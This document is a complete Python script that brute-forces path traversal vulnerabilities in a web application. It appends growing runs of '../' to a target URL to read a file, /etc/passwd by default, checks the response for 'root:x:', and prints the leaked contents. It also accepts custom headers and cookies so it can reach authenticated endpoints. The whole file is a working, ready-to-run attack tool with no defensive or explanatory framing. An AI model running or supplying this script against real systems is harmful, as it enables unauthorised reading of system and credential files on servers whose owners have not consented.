import requests
import argparse
import sys

def main():
    """
    Main function to parse arguments and initiate path traversal testing.
    """
    parser = argparse.ArgumentParser(
        description="A script for brute forcing path traversal vulnerabilities."
    )

    # Required target URL
    parser.add_argument(
        "-t", "--target",
        required=True,
        type=str,
        help="Target URL to test for path traversal (e.g., http://test.com/download?path=)"
    )

    # Optional depth parameter (default: 10)
    parser.add_argument(
        "-d", "--depth",
        type=int,
        default=10,
        help="Depth of traversal (default: 10)."
    )

    # Optional target file parameter (default: /etc/passwd)
    parser.add_argument(
        "-f", "--file",
        type=str,
        default="etc/passwd",
        help="File path to look for. Exclude the first '/'. (Default: etc/passwd)"
    )

    # Optional string to look for in the response
    parser.add_argument(
        "-e", "--expected-string",
        type=str,
        default="root:x:",
        help="String to look for in the response (default: 'root:x:')."
    )

    # Optional Headers (Accepts multiple `-H "Key: Value"` arguments)
    parser.add_argument(
        "-H", "--header",
        action="append",
        help="Custom headers to add (format: 'Key: Value'). Use multiple times for multiple headers."
    )

    #Optional Cookies (Accepts multiple `-C "Key=Value"` arguments)
    parser.add_argument(
        "-C", "--cookie",
        action="append",
        help="Custom cookies to add (format: 'Key=Value'). Use multiple times for multiple cookies."
    )

    args = parser.parse_args()

    # Validate target URL
    if not args.target.startswith(("http://", "https://")):
        print("Error: Invalid target URL. Ensure it starts with 'http://' or 'https://'.")
        sys.exit(1)

    headers = parse_headers(args.header) if args.header else {}
    cookies = parse_cookies(args.cookie) if args.cookie else {}

    # Run path traversal test
    test_path_traversal(args.target, args.depth, headers, cookies, args.file, args.expected_string)


def parse_headers(header_list):
    """
    Converts argument list into a dictionary for requests headers.
    """
    headers = {}
    for header in header_list:
        try:
            key, value = header.split(":", 1)  # Split only at the first `:`
            headers[key.strip()] = value.strip()
        except ValueError:
            print(f"Invalid header format: {header}. Use 'Key: Value'.")
            sys.exit(1)
    return headers

def parse_cookies(cookie_list):
    """
    Converts argument list into a dictionary for requests cookies.
    """
    cookies = {}
    for cookie in cookie_list:
        try:
            key, value = cookie.split("=", 1)  # Split only at the first `=`
            cookies[key.strip()] = value.strip()
        except ValueError:
            print(f"Invalid cookie format: {cookie}. Use 'Key=Value'.")
            sys.exit(1)
    return cookies


def test_path_traversal(target, depth, headers, cookies, file_path, expected_string):
    """
    Attempts path traversal by iterating through directory levels.

    :param target: The target URL.
    :param depth: Depth of traversal.
    :param headers: Headers to use in the request.
    :param cookies: Cookies to use in the request.
    :param file_path: The file to attempt access to.
    :param expected_string: String expected in a successful response.
    """
    traversal = "../"

    for i in range(depth):
        url = f"{target}{traversal * i}{file_path}"
        print(f"Trying: {url}")

        try:
            response = requests.get(url, headers=headers, cookies=cookies, timeout=5)
            if expected_string in response.text:
                print("\n[+] Path Traversal Successful!")
                print(response.text)
                return
        except requests.exceptions.RequestException as e:
            print(f"Error making request: {e}")

    print("\n[-] Path Traversal Unsuccessful.")


if __name__ == "__main__":
    main()

